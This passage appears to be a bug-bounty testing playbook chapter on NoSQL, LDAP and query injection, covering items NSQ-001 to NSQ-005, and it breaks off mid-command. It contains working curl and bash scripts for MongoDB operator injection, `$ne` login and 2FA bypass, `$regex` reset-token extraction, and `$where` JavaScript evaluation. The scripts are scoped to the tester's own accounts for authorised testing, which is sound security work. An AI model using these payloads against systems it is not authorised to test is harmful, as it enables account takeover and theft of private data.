# NSQ · NoSQL, LDAP & other query injection

> A value from the request becomes part of the structure of a query that is not SQL: an object turns into a
> MongoDB or ORM operator, a string into `$where` JavaScript, a metacharacter into a new LDAP, XPath or Lucene
> clause. It is a finding when that structure reads what the caller may not read (our own reset token before
> login, the second account's records, a field the API never returns) or passes a credential check without the
> secret, and it is paid at the level of that impact; few disclosed reports in the class carry a bounty. An
> operator that is merely accepted, or an error that names the engine, is a signal and not a finding.

| | |
|---|---|
| **Class** | `nosqli` |
| **Applies when** | http, app\|api, params |
| **Pays** | 16 disclosed reports, 4 paid, median $2,750, top $4,500, and 8 more in other classes touch it. All four paid ones are GitHub Security Lab bounties for LDAP and XPath CodeQL queries; the field reports are operator objects and regular expressions in Meteor-method and reset-token lookups and LDAP filters in login and WebFinger, on programmes that paid nothing. The best-paid web report touching the class is a GraphQL filter evaluated by sift `$where` ($12,000). |
| **Weaknesses** | NoSQL Injection · LDAP Injection · XML Injection · Improper Handling of Unexpected Data Type · CWE-943, CWE-90, CWE-643, CWE-1287 |

## Why it pays

Document stores and Node ORMs take a query as a data structure. Code written as `findOne({token: body.token})`
expects a string; a JSON body, a bracketed form field (`token[$regex]=^a`) or an untyped method argument delivers
an object, and the driver obeys the operator inside it. Nearly every field report in the library is that shape on
an id or a secret: Rocket.Chat's Meteor methods took `{"$gt": …}` or a regular expression for a room, thread or
file id and returned private thread content (#3852135, high), S3 upload URLs (#1458020, medium) and a visitor's
token and messages (#2580062); blind injections before and after login ended in account takeover or code
execution (#386807, critical, in a password reset; #1581059, "Regex account takeover"; #1130721 and #1130874); a
shop's customer lookup enumerated customer and administrator e-mails (#397445). None of these shows a bounty. On a
paying programme the report is rated by the impact it reaches (account takeover, another account's data) and
filed under the injection.

The older half of the class is string-built: LDAP filters in login forms and identity servers (#359290; #1278050
and #1278891, CVE-2021-29156 in OpenAM's WebFinger, each medium on a programme without bounties), XPath over XML
stores, and Lucene or Solr syntax in search parameters. A Solr filter injection that the programme judged low
impact still paid $2,000 (#952501); two LocalParams injections on the same programme paid $150 and $100 (#953203,
#844428). The ceiling is a filter or sort argument that reaches an evaluator: sift's `$where` in a GraphQL filter
ran JavaScript in the server process ($12,000, #3782701) and an Elasticsearch sort ran Painless ($7,000,
#3694007). This chapter finds those arguments; RCE-007 proves the evaluation.

The four paid reports filed under the class are CodeQL query bounties from GitHub Security Lab (#1212273, $4,500;
#787113, $3,000; #956295, $2,500; #852316, $1,800). They show that the sinks are common in code; they say nothing
about what a programme pays for a request. Expect the triager to ask what was read: an accepted operator is a
primitive, our own reset token read before login is an account takeover.

## The crux question

**Where does a value I send stop being a literal and become part of the query (an operator object, a regular
expression, a script, a filter or path clause), and which question about a record I may not read can I make that
query answer?**

## Applicability probe

The chapter gate is `params`. Settle it from the recorded traffic, and settle on the way the facts that gate
single items: `api`, `node`, `php`, `ruby` (how an object can arrive: NSQ-001 to NSQ-003), `login` and `account`
(NSQ-002, NSQ-005, NSQ-006), `two-accounts` (NSQ-003), `graphql` (NSQ-005), `node` (NSQ-006). Step 3 identifies the
store behind the parameters; no fact tag records it.

```bash
# 1. parameters at all (the chapter gate): names by frequency
grep -rhoE '[?&][][A-Za-z0-9_.%$-]+=' "$E/recon/$H/requests/" "$E/recon/$H/urls-history.txt" 2>/dev/null | sort | uniq -c | sort -rn | head -40
# 2. how an object can arrive: JSON bodies, bracketed names, JSON inside a parameter
grep -rliE '^content-type: *application/json' "$E/recon/$H/requests/" 2>/dev/null | wc -l
grep -rhoE '[?&"][A-Za-z_]+\[[^]=]*\]|[?&"](query|filter|where|selector|conditions)"?[=:] *("|%7B|\{)' \
  "$E/recon/$H/requests/" "$E/recon/$H/routes-from-js.txt" 2>/dev/null | sort | uniq -c | sort -rn | head -20
# 3. which store answers: MongoDB ids and keys, search-engine envelopes, ORM, directory and XPath errors
grep -rhoaE '"(_id|__v)":|"[0-9a-f]{24}"|"took":|"hits":\{"total"|"numFound":|"_index":' "$E/recon/$H/requests/" 2>/dev/null \
  | sed -E 's/"[0-9a-f]{24}"/<objectid>/' | sort | uniq -c | sort -rn | head
grep -rlaiE 'MongoServerError|MongoError|CastError|E11000|mongoose|PrismaClient|Sequelize|TypeORM|parse_exception|org\.apache\.solr|javax\.naming|ldap_search|Bad search filter|XPathException|DOMXPath' \
  "$E/recon/$H/" 2>/dev/null | head
```

```bash
scripts/sane fact set "$H" params=1 --ev "GET /api/v1/items?status=open, POST /api/v1/auth/login (JSON) and 30 more parameter-taking requests in recon/$H/requests/"
scripts/sane fact set "$H" api=1 node=1 --ev "JSON request bodies on /api/v1/*; X-Powered-By: Express; 24-hex _id and __v in every object"
# nothing takes input:
scripts/sane fact set "$H" params=0 --ev "crawl and proxy history hold only static files; ?x=1 on 10 routes returns byte-identical bodies"
```

With `params` false the chapter closes for the asset and the planner writes the reason. A relational database does
not close it: a search engine, a directory or an XML file often sits beside it. Write what step 3 found into the
note of the first item you mark (`MongoDB via Mongoose: CastError on /api/v1/items`, `Solr behind /search:
numFound`, `LDAP login: javax.naming in the error`), so that the items that follow use the right syntax.

## Triage order

NSQ-001 (operator objects in JSON and bracket parameters: cheap, and it says which endpoints reach MongoDB or an
ORM operator) → NSQ-002 (the login, reset and code checks among them: the highest ceiling for the fewest
requests) → NSQ-003 (id and scope parameters, with B's object as the target) → NSQ-006 (Node ORM where-objects) →
NSQ-005 (GraphQL filter arguments) → NSQ-004 (`$where`, once MongoDB is known) → NSQ-009 (search parameters:
Lucene, Elasticsearch, Solr) → NSQ-007 (LDAP, on enterprise logins and directory searches) → NSQ-008 (XPath, last:
the rarest back end).

## Items

### NSQ-001 · A parameter sent as an object (`{"$eq":…}` in JSON, `p[$eq]=` in a query string or form) reaches MongoDB as a query operator instead of a literal value

| | |
|---|---|
| **Severity** | None standalone; the entry primitive that NSQ-002, NSQ-003 and NSQ-004 turn into a High or Critical read |
| **Requires** | api\|node\|php\|ruby |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | NoSQL Injection · CWE-943 |
| **Prior art** | #3852135, #1458020, #1757676, #397445 |

- **Where:** every parameter whose value the server compares with stored data, from `$E/recon/$H/requests/` and
  `$E/recon/$H/routes-from-js.txt`: ids in paths, query strings and bodies; status, type, category, tag and search
  values; user names, e-mail addresses, codes and tokens; Meteor method arguments (DDP over WebSocket, or a REST
  bridge such as Rocket.Chat's `POST /api/v1/method.call/<method>`; #1757676 was one such method). An object
  arrives three ways: a JSON body (any stack); bracket syntax in a query string or form (`p[$eq]=v`, parsed into an
  object by PHP, Rack and Rails, and by Express 4's default `qs` parser; Express 5 keeps `p[$eq]` as a literal key
  unless the `query parser` setting is `extended`); and JSON inside a string parameter that the server parses
  (`query={"status":"open"}`, `filter=`, `where=`, `selector=`). CouchDB Mango (`selector`) and Parse Server
  (`where=`) use the same `$` names. One row per parameter in `$E/evidence/$H/NSQ-001/params.md`.
- **Test:** compare the plain value with operator forms that select the same records (`$eq`, `$in` with the one
  value, an anchored `$regex`), with an unknown operator, and with a plain key inside the same object. When the
  operator forms return the base result while the plain key returns nothing, the server passed the object to the
  query. Use only operators that return what the plain value returns or less: `$ne`, `$gt`, `$exists` or `.*` on a
  field that scopes the query to the caller returns other users' records.
- **How:**
  ```bash
  D="$E/evidence/$H/NSQ-001"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; print (w<1)?1:w}')
  U="$T/api/v1/items"; UJ="$T/api/v1/items/search"; P=status; V=open    # one parameter; V: URL-safe, returns a few of our own records
  B0='{"page":1}'                                                        # the JSON body the client sends to UJ, minus the parameter
  sig() { local b="$D/$P.$1.body"
          printf '%s\t%s\tn=%s\t%s\n' "$1" "$(md5sum < "$b" | cut -c1-8)" \
            "$(jq -r 'if type=="array" then length else (.total // .count // ((.data // .items // .results // [])|length)) end' "$b" 2>/dev/null)" \
            "$(grep -aoE "unknown operator[^\"]{0,30}|Can't use [$][A-Za-z0-9]+ with [A-Za-z]+|Cast to [A-Za-z]+ failed|CastError|MongoServerError|MongoError|BSON[A-Za-z]*Error|Regular expression is invalid" "$b" | sort -u | head -2 | paste -sd' ')"; }
  qs() { curl -sS -g "${HDR[@]}" $A "$U?$2" -o "$D/$P.$1.body" -w "%{http_code} %{size_download}  "; sig "$1"; sleep "$W"; }
  js() { curl -sS "${HDR[@]}" $A -X POST "$UJ" -H 'Content-Type: application/json' \
           -d "$(jq -c --arg p "$P" --argjson v "$2" '.[$p]=$v' <<<"$B0")" -o "$D/$P.$1.body" -w "%{http_code} %{size_download}  "; sig "$1"; sleep "$W"; }
  { qs base "$P=$V";             qs base2 "$P=$V"                             # is the response stable at all?
    qs eq   "$P[\$eq]=$V";       qs in    "$P[\$in][]=$V";      qs regex "$P[\$regex]=%5E$V%24"
    qs key  "$P[nsq001]=$V";     qs unk   "$P[\$nsq001]=1";     qs arr   "$P[]=$V"
    qs sjs  "filter=$(jq -rn --arg p "$P" --arg v "$V" '{($p):{"$eq":$v}}|tojson|@uri')"        # JSON inside a parameter
    js jbase "$(jq -cn --arg v "$V" '$v')";            js jeq  "$(jq -cn --arg v "$V" '{"$eq":$v}')"
    js jin   "$(jq -cn --arg v "$V" '{"$in":[$v]}')";  js jre  "$(jq -cn --arg v "$V" '{"$regex":("^"+$v+"$")}')"
    js jkey  "$(jq -cn --arg v "$V" '{nsq001:$v}')";   js junk '{"$nsq001":1}'
  } | tee "$D/$P.tsv"
  ```
  ```text
  operators honoured   eq, in and regex (jeq, jin, jre) carry the base hash and count; key returns no record; unk
                       raises "unknown operator: $nsq001" (MongoDB) or "Can't use $nsq001 with String" (Mongoose),
                       or a 500 that eq does not
  arrays cast to $in   arr equals base: Mongoose turns an array for a scalar field into $in (NSQ-003 with two ids)
  cast to a string     eq and in return nothing: the object became "[object Object]" or was dropped
  validated            every object row answers 400 with a schema message (Joi, zod, check(String))
  sanitised            eq, in and regex return what key returns: the $-keys were stripped (express-mongo-sanitize,
                       Mongoose sanitizeFilter)
  another grammar      {"contains":…}, {"not":…} or {"startsWith":…} honoured and $-keys refused: an ORM, NSQ-006
  ```
- **Proof:** for one parameter, `$P.tsv` in which the operator rows reproduce the base result, the plain-key row
  does not, and the unknown operator raises an error that names it, with the requests and responses saved raw.
  This is the primitive; the report needs what NSQ-002, NSQ-003 or NSQ-004 reads through it.
- **Not a finding when:** the operators are the API's documented filter language: Strapi's
  `filters[field][$eq]`, Parse's `where=`, LoopBack's `filter[where][field][gt]`, an admin query console. They are
  honoured by design, and the question there is which rows and fields they reach (NSQ-006, BAC-009). `$ne` or `$gt`
  returns more of the records the caller could list anyway. `unknown operator` comes from a search service's own
  query language (Elasticsearch, Algolia): NSQ-009. A 500 for every object, `eq` included: type confusion without a
  query change. The base and base2 hashes differ: compare counts, not hashes.
- **Escalate:** an operator honoured on a password, token or code field: NSQ-002. On an id, room, thread, file or
  tenant parameter: NSQ-003. On any MongoDB parameter: `$where` and `$expr` (NSQ-004). When the whole request is
  the query (`find(req.query)`: an unknown field filters the result), add a field the response hides
  (`resetToken[$exists]=true`, `role=admin`) and follow NSQ-006's hidden-field read. Record the store:
  `scripts/sane mark "$H" NSQ-001 parked --note "MongoDB via Mongoose: status[\$eq] honoured on GET /api/v1/items; arrays cast to \$in"`.

### NSQ-002 · A password, reset-token or one-time-code check is a database match that accepts an operator object, so `$ne` passes it without the secret and `$regex` reads the secret

| | |
|---|---|
| **Severity** | Critical standalone when a login or reset passes for our account A with only its user name or e-mail, or A's reset token is read before login; High for a second factor, an API key or an invitation token passed or read |
| **Requires** | login, account, api\|node\|php\|ruby |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | NoSQL Injection · CWE-943 |
| **Prior art** | #386807, #1581059, #1130721 |

- **Where:** every request where the server checks a secret by querying for it: login (when passwords are stored
  in plain text or compared inside the query), magic-link and e-mail-code sign-in, OTP and 2FA verification,
  password-reset token check and reset completion (#386807 was a password reset), e-mail verification and
  invitation acceptance, API-key and personal-token lookups, "remember me" selectors. JSON for API bodies, bracket
  syntax for form posts and reset links (`password[$ne]=x`, `token[$regex]=^ab`). Every probe is bound to our
  account A: A's user name or e-mail in the same request, A's own pending challenge, or a prefix of A's own token.
- **Test:** two probes against one sink. `$ne`, `$gt`, `$exists` or an empty-anchored `$regex` in the secret
  field, with A's identifier beside it: a session or a success for A without the secret means the check is the
  query. `$regex` with an anchored prefix: true or false for "the secret starts with X" turns into a read, about
  four requests per hex character. Never put an operator in the identifier: `{"username":{"$ne":""}}` signs in as
  the first user in the collection, usually a real administrator. Never send an operator in a token that is the
  only selector of a request that acts: `{"token":{"$ne":""},"password":"…"}` resets the password of whichever
  real user's token comes first.
- **How:**
  ```bash
  D="$E/evidence/$H/NSQ-002"; mkdir -p "$D"; CT='Content-Type: application/json'; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; print (w<1)?1:w}')
  ID_A='<A user name or e-mail>'; PW_A='<A password>'; L="$T/api/v1/auth/login"
  lg() { curl -sS "${HDR[@]}" -X POST "$L" -H "$CT" -d "$2" -D "$D/$1.hdr" -o "$D/$1.body" -w "$1\t%{http_code}\t%{size_download}\t"
         printf 'cookies=%s token=%s\n' "$(grep -ci '^set-cookie:' "$D/$1.hdr")" "$(grep -coE '"(access_?token|token|jwt)" *: *"' "$D/$1.body")"; sleep "$W"; }
  { lg right "$(jq -cn --arg u "$ID_A" --arg p "$PW_A" '{username:$u,password:$p}')"        # control: signs A in
    lg wrong "$(jq -cn --arg u "$ID_A" '{username:$u,password:"nsq002-wrong"}')"            # control: refused
    for p in 'ne:{"$ne":"nsq002-wrong"}' 'gt:{"$gt":""}' 'exists:{"$exists":true}' 'regex:{"$regex":"^"}'; do
      lg "op-${p%%:*}" "$(jq -cn --arg u "$ID_A" --argjson v "${p#*:}" '{username:$u,password:$v}')"; done
  } | tee "$D/login.tsv"
  curl -sS "${HDR[@]}" -X POST "$T/login" --data-urlencode "username=$ID_A" --data-urlencode 'password[$ne]=nsq002-wrong' \
    -D "$D/form-ne.hdr" -o /dev/null -w 'form password[$ne]: %{http_code} %{redirect_url}\n'                  # the same through a form post
  # whose session did an accepted operator request issue? the cookie from the saved headers, or the token from the body
  curl -sS "${HDR[@]}" -b "$D/op-ne.hdr" "$T/api/v1/me" | head -c 300; echo
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $(jq -r '.access_token // .token // empty' "$D/op-ne.body")" "$T/api/v1/me" | head -c 300; echo
  # a one-time code, bound to A's own challenge: A's password step done, the code prompt open
  C2="$T/api/v1/auth/2fa/verify"; PRE="-H @$D/A-pre2fa.headers"                  # the cookie or token A's password step returned
  for v in '"000000"' '{"$ne":"000000"}' '{"$gt":""}' '{"$regex":"^"}'; do
    curl -sS "${HDR[@]}" $PRE -X POST "$C2" -H "$CT" -d "{\"code\":$v}" -o "$D/otp.body" -w "code=$v %{http_code} %{size_download}\n"; sleep "$W"; done | tee "$D/otp.tsv"
  ```
  ```bash
  # $regex read of A's own reset token, through a check that changes nothing. Request a reset for A first
  curl -sS "${HDR[@]}" -X POST "$T/api/v1/auth/forgot" -H "$CT" -d "$(jq -cn --arg e '<A e-mail>' '{email:$e}')" -o /dev/null -w 'reset for A: %{http_code}\n'
  TOK='<token from A reset e-mail>'; SEED=${TOK:0:6}; R="$T/api/v1/auth/reset/check"
  AL='0123456789abcdef'                          # the token's alphabet: hex here; base64url is 0-9A-Za-z_- (keep - last)
  re() { printf '%s' "$1" | sed 's/[][\\.^$*+?(){}|/-]/\\&/g'; }              # escape regex metacharacters
  ask() { curl -sS "${HDR[@]}" -X POST "$R" -H "$CT" -d "$(jq -cn --arg r "^$1" '{token:{"$regex":$r}}')" -o "$D/ask.body"
          grep -qE '"valid" *: *true' "$D/ask.body"; local r=$?; sleep "$W"; return $r; }
  # a reset page instead of an API: curl -sS -g "${HDR[@]}" --get --data-urlencode "token[\$regex]=^$1" "$T/reset-password", then grep for the new-password field
  ask "$(re "$SEED")" && ! ask "$(re "$SEED")[^$(re "$AL")]" || echo "the oracle is not clean: stop"
  got=$SEED                                      # starting from A's own six characters keeps every question about A's token
  while [ ${#got} -lt ${#TOK} ]; do lo=0; hi=$(( ${#AL} - 1 ))
    while [ "$lo" -lt "$hi" ]; do mid=$(( (lo + hi) / 2 ))
      if ask "$(re "$got")[$(re "${AL:lo:mid-lo+1}")]"; then hi=$mid; else lo=$((mid + 1)); fi; done
    got="$got${AL:lo:1}"; done
  printf 'read %s\nmail %s\n' "$got" "$TOK" | tee "$D/token-read.txt"; ask "$(re "$TOK")\$" && echo "the full token answers true"
  ```
  The read starts from A's first six characters, so no question can be answered by another user's token. Never
  start from an empty prefix: `^a` is true for any pending token that starts with `a`. A login oracle counts each
  false answer as a failed sign-in for A: use the reset check where one exists.
- **Proof:** for `$ne`: the wrong-string control refused, the operator request accepted, and `me` with the issued
  session showing A's identity, the request having carried A's identifier and no secret. For `$regex`: the true
  and false pair, the value read, and the token from A's reset e-mail beside it, identical, with one request for
  the full token as `^…$` answering true. State whether the request needs a session: the pre-auth read is the
  critical case.
- **Not a finding when:** the user is fetched by name and the password compared in code (`bcrypt.compare` of an
  object throws or returns false): every operator is refused like the wrong string. The operator request returns
  200 with `"success":false`, or the next step asks for the password again. The reset check accepts the operator
  but the completion step re-checks the token as a string. The stored value is a hash of the token: the read gives
  64 hex characters that differ from the e-mailed token; the oracle is real and the value cannot be replayed, so
  report it for what it is or move to another field. A typed value passed without any operator (`true`, `[]`,
  `0`) is API-009's loose comparison in code, not a database match.
- **Escalate:** a pre-auth read of A's reset token means takeover of any account whose e-mail is known: say so,
  and never request a reset for anyone but A. The same lookup on a session or API-key collection: name it, do not
  read it. A login passed with `$ne` is also an authentication finding: one report under the root cause. A lockout
  or rate limit that stops the read is AUT-008's arithmetic; a code accepted in bulk through an array is API-009.

### NSQ-003 · An operator object or array in an id parameter passes the access check on our own object while the data query also returns the second account's

| | |
|---|---|
| **Severity** | High standalone when B's private messages, files or personal data appear in A's response; Critical when the value returned is a session, reset or visitor token that opens B's account; Medium when only identifiers, names or file URLs of B's objects come back |
| **Requires** | two-accounts, api\|node\|php\|ruby |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | NoSQL Injection · CWE-943 |
| **Prior art** | #3852135, #1458020, #2580062, #1377105 |

- **Where:** handlers that authorise one object and then query by the same raw value: messages of a room, thread,
  channel or conversation; files of a folder; read receipts (#1377105); file-URL lookups (#1458020 took a regular
  expression for a file id); project and workspace children. Meteor methods and their REST bridges
  (`POST /api/v1/method.call/<method>` with an EJSON `message` string) take untyped arguments unless the method
  calls `check()`. #3852135 is the shape: `findOne` on a room id authorised one room while the message query with
  the same `{"$gt": …}` read every room. Guest and visitor endpoints keyed by a visitor token or room id count too
  (#2580062): two visitor sessions we create are the two accounts.
- **Test:** A sends a value that matches exactly A's object and B's object and nothing else: `{"$in":[A_id,B_id]}`,
  the array `[A_id,B_id]` (Mongoose turns an array for a scalar field into `$in`), or `{"$regex":"^(A_id|B_id)$"}`.
  Create A's object before B's: an unsorted `findOne` returns the older document, so the access check sees A's.
  Never `$ne`, `$gt`, `$exists` or an unanchored regex here: they reach real users' objects.
- **How:**
  ```bash
  D="$E/evidence/$H/NSQ-003"; mkdir -p "$D"; CT='Content-Type: application/json'; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; print (w<1)?1:w}')
  IA='<id of A object, created first>'; IB='<id of B object, created after it>'; MB='zqxnsq003'   # B wrote MB into its object, as B
  U="$T/api/v1/threads.list"; K=rid; B0='{"count":10}'          # the request the client sends for one object, minus the id
  row() { printf '%s\t%s\tmarker=%s\n' "$1" "$(cat "$D/$1.code")" "$(grep -o "$MB" "$D/$1.body" | wc -l)"; sleep "$W"; }
  g() { curl -sS -g "${HDR[@]}" $A --get "${@:2}" "$U" -o "$D/$1.body" -w '%{http_code} %{size_download}' > "$D/$1.code"; row "$1"; }
  j() { curl -sS "${HDR[@]}" $A -X POST "$U" -H "$CT" -d "$(jq -c --arg k "$K" --argjson v "$2" '.[$k]=$v' <<<"$B0")" \
          -o "$D/$1.body" -w '%{http_code} %{size_download}' > "$D/$1.code"; row "$1"; }
  two=$(jq -cn --arg a "$IA" --arg b "$IB" '[$a,$b]')
  { g own   --data-urlencode "$K=$IA"                                  # A's own object: allowed, no marker
    g ctrl  --data-urlencode "$K=$IB"                                  # B's object alone: refused (the control)
    g in    --data-urlencode "$K[\$in][]=$IA" --data-urlencode "$K[\$in][]=$IB"
    g arr   --data-urlencode "$K[]=$IA" --data-urlencode "$K[]=$IB"
    g regex --data-urlencode "$K[\$regex]=^($IA|$IB)\$"
    j jin   "$(jq -cn --argjson t "$two" '{"$in":$t}')"
    j jarr  "$two"
    j jre   "$(jq -cn --arg a "$IA" --arg b "$IB" '{"$regex":("^(" + $a + "|" + $b + ")$")}')"
  } | tee "$D/results.tsv"
  # a Meteor method behind a REST bridge (Rocket.Chat-style): the argument object travels inside an EJSON string
  M=getThreadsList
  MSG=$(jq -cn --arg m "$M" --argjson t "$two" '{msg:"method",id:"1",method:$m,params:[{rid:{"$in":$t},count:10}]}|tojson')
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/method.call/$M" -H "$CT" -d "$(jq -cn --arg s "$MSG" '{message:$s}')" \
    -o "$D/ddp.body" -w 'ddp %{http_code}  '; grep -o "$MB" "$D/ddp.body" | wc -l
  ```
  Put the method's other arguments in `params` as the client sends them; over a raw DDP WebSocket the same
  `params` array goes in the `method` message.
- **Proof:** `results.tsv`: A's own request allowed without the marker, B's id alone refused, and the bounded
  operator or array request returning B's marker in A's response; B's own view of the object showing that it is
  private; all saved raw. Both ids are ours: no third account's object was requested.
- **Not a finding when:** the access check and the data query use one filtered query, so the operator returns
  A's object only (no marker): the check is per document. The bounded request is refused like B's id alone: the
  check sees both documents or casts the id to a string. A may read B's object by design (a public channel, a
  shared folder, the same team). The marker comes from A's own copy (a quote, a notification). Every object gets a
  500: type confusion without effect. Only a count or an existence flag comes back for B's id: an oracle on ids,
  Low at most (#1377105 enumerated message ids).
- **Escalate:** a returned value that opens B's account (a visitor or session token, #2580062; a signed file URL,
  #1458020): use it once as A to show B's view, then stop. Other methods that share the same unchecked helper: one
  report with every method listed (#3852135 names itself the unpatched sibling of #1446767). A guest or visitor
  endpoint makes the finding pre-auth: say so (`PR:N`).

### NSQ-004 · A value is evaluated as JavaScript by MongoDB's `$where`, either pasted into the expression or sent as a `$where` operator

| | |
|---|---|
| **Severity** | High standalone when a field the API never returns (a token, a hash) is read from our own document through the expression; Critical when the same read needs no session, shown on B's document; Medium for evaluation shown by an arithmetic pair or a bounded delay without a read |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | NoSQL Injection · CWE-943 |
| **Prior art** | #1130874, #3782701 |

- **Where:** No further gate: a value pasted into a `$where` string needs no object channel, and no fact marks
  MongoDB. Aim at parameters NSQ-001 tied to MongoDB; endpoints that take a whole query document (`query=`,
  `filter=`, `where=`, `selector=`; a list API that takes a query, as `users.list` did in #1130874); and any
  parameter whose error mentions `$where`, `JavaScript`, `SyntaxError` or `ReferenceError` next to a Mongo error.
  Two shapes: the operator accepted from JSON or brackets (`{"$where":"…"}`, `filter[$where]=…`), and a value
  concatenated into a `$where` string the code builds (`"this.owner == '" + v + "'"`).
- **Test:** make the expression answer a question only JavaScript can answer, on our own document: `7*191==1337`
  true against `7*191==1338` false. Then find where it runs: inside mongod `typeof sleep` is `function` and
  `typeof process` is `undefined`; in a Node query library (sift, mingo) it is the other way round, and RCE-007
  takes over. `$where` runs once for every document the rest of the query selects: put an equality that only A's
  documents satisfy first in every expression, so that every other document stops at `false`, and call `sleep`
  only behind it.
- **How:**
  ```bash
  D="$E/evidence/$H/NSQ-004"; mkdir -p "$D"; CT='Content-Type: application/json'; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; print (w<1)?1:w}')
  U="$T/api/v1/items/search"; OWN='this.owner=="<A user id>"'     # true for A's documents only: first in every expression
  n() { jq -r 'if type=="array" then length else (.total // .count // ((.data // .items // .results // [])|length)) end' "$1" 2>/dev/null; }
  q() { curl -sS "${HDR[@]}" $A -X POST "$U" -H "$CT" -d "$(jq -cn --arg w "$2" '{filter:{"$where":$w}}')" \
          -o "$D/$1.body" -w "$1\t%{http_code}\t%{size_download}\t%{time_total}\t"; n "$D/$1.body"; sleep "$W"; }
  { q true  "$OWN && 7*191==1337";  q false "$OWN && 7*191==1338"
    q eng   "$OWN && typeof sleep=='function' && typeof process=='undefined'"   # true: mongod. false: a Node library, RCE-007
    q d2    "$OWN && (sleep(2000)||true)";  q d0 "$OWN && (sleep(0)||true)";  q d2b "$OWN && (sleep(2000)||true)"
  } | tee "$D/where.tsv"
  # a value pasted into a $where string ("this.owner == '" + v + "'"): close the quote, add the condition, reopen
  P=owner; V='<A user id>'
  for c in "7*191==1337" "7*191==1338"; do
    curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$V' && $c && '1'=='1" "$T/api/v1/items" -o "$D/str.body" \
      -w "$c\t%{http_code}\t%{size_download}\n"; sleep "$W"; done | tee "$D/string.tsv"
  # double-quoted builds: $V" && 7*191==1337 && "1"=="1      where $where is refused and $expr is not:
  #   {"$expr":{"$function":{"body":"function(o){return o==\"<A user id>\" && 7*191==1337}","args":["$owner"],"lang":"js"}}}
  ```
  ```bash
  # read a field of A's own document that no response contains, eight requests per character
  F=resetToken
  ask() { q a "$OWN && typeof this.$F=='string' && this.$F.charCodeAt($1)>$2" | awk -F'\t' '{exit !($5>0)}'; }
  out=""; for i in $(seq 0 47); do ask "$i" 31 || break; lo=32; hi=126
    while [ "$lo" -lt "$hi" ]; do mid=$(( (lo + hi) / 2 )); if ask "$i" "$mid"; then lo=$((mid + 1)); else hi=$mid; fi; done
    out="$out$(printf "\\$(printf '%03o' "$lo")")"; done; printf '%s\n' "$out" | tee "$D/$F.txt"
  # one request when the response prints database errors: the value inside the error text
  q err "$OWN && (function(o){throw new Error('nsq004:'+o.$F)})(this)"; grep -ao 'nsq004:[^"\\]*' "$D/err.body"
  ```
- **Proof:** `where.tsv` with the true and false pair differing only in `1337` against `1338`, the engine row true,
  and the two-second rows against the zero-second row (one document, one delay); then one hidden field of A's own
  document read through the condition or printed by the error form, beside A's view showing that the API never
  returns it. For a claim about the whole collection, read the same field of B's document with B's id in `OWN`.
- **Not a finding when:** the pair differs because the application filters the fetched records in its own code
  (no delay, `typeof sleep` false). The engine row is false and `typeof process=='object'` is true: the expression
  runs in the Node process, which is RCE-007's (#3782701), not this card's. Every value returns an error that names
  `$where` or JavaScript: server-side JavaScript is disabled (`security.javascriptEnabled: false`) or the operator
  is rejected. The delay is the number of documents times two seconds: the equality was not first; stop and fix it
  before sending anything else.
- **Escalate:** inside mongod the expression sees only the documents of the queried collection (`this`); since
  MongoDB 2.4 there is no `db` object in `$where`, and no file or process access. State the collection and the
  fields readable, and stop. A read of tokens or hashes across the collection is shown on B's document only.

### NSQ-005 · A GraphQL filter argument is handed to the database as a query document, and an operator or a field the output type hides decides which records come back

| | |
|---|---|
| **Severity** | High standalone when B's records, or a hidden field of A's own record (a token, a hash), are read through the argument; Critical when the operation needs no session and the read reaches tokens; None when the operators reach only records and fields the caller may read |
| **Requires** | graphql, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | NoSQL Injection · CWE-943 |
| **Prior art** | #3782701, #645299, #1838329 |

- **Where:** arguments of a JSON-like custom scalar (`JSON`, `JSONObject`, `Object`, `Mixed`, `Any`, `Filter`,
  `BSON`); String arguments named for structure (`filter`, `where`, `query`, `selector`, `conditions`) that the
  resolver parses; and generated filter input types (`*WhereInput`, `*Filter*`, graphql-compose-mongoose, Strapi,
  KeystoneJS) that list every field of the model. GraphQL names cannot contain `$`, so a MongoDB operator arrives
  only through the first two; the third is an ORM filter grammar published through the schema. #3782701 was a
  `filter` argument evaluated by sift; #645299 and #1838329 read private information through filters and
  aggregates. Operations come from `$E/recon/$H/requests/` and the bundles in `$E/recon/$H/js/`.
- **Test:** three checks, payloads always in `variables`. A JSON argument: `$eq` and `$in` with the plain value
  reproduce it and `$nsq005` raises "unknown operator". A generated filter type: list the input fields that no
  output type has, and filter A's own record on one of them. An ownership key inside the filter: a resolver that
  builds `{owner: me, ...args.filter}` lets the client's `owner` win; `{...args.filter, owner: me}` does not.
- **How:**
  ```bash
  D="$E/evidence/$H/NSQ-005"; mkdir -p "$D"; G="$T/graphql"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; print (w<1)?1:w}')
  g() { curl -sS "${HDR[@]}" $A -X POST "$G" -H 'Content-Type: application/json' -d "$2" -o "$D/$1.json" -w "$1\t%{http_code}\t%{size_download}\t"
        jq -c '[([.data // {} | .. | arrays] | map(length) | add // 0), [.errors[]?.message[0:90]]]' "$D/$1.json" 2>/dev/null || echo; sleep "$W"; }
  # 1. the schema: JSON-like scalars, and filter-input fields that no output type has
  g schema '{"query":"{__schema{types{name kind fields{name} inputFields{name}}}}"}'
  jq -r '.data.__schema.types[] | select(.kind=="SCALAR") | .name' "$D/schema.json" | grep -vxE 'String|Int|Float|Boolean|ID'
  jq -r '.data.__schema.types as $t | ([$t[] | select(.kind=="OBJECT" or .kind=="INTERFACE") | .fields[]?.name] | unique) as $out
         | $t[] | select(.kind=="INPUT_OBJECT") | .name as $n | .inputFields[]?.name | select(. as $f | $out | index($f) | not) | "\($n).\(.)"' "$D/schema.json" \
    | grep -iE '^[^.]*(where|filter|bool_exp|condition)[^.]*\.' \
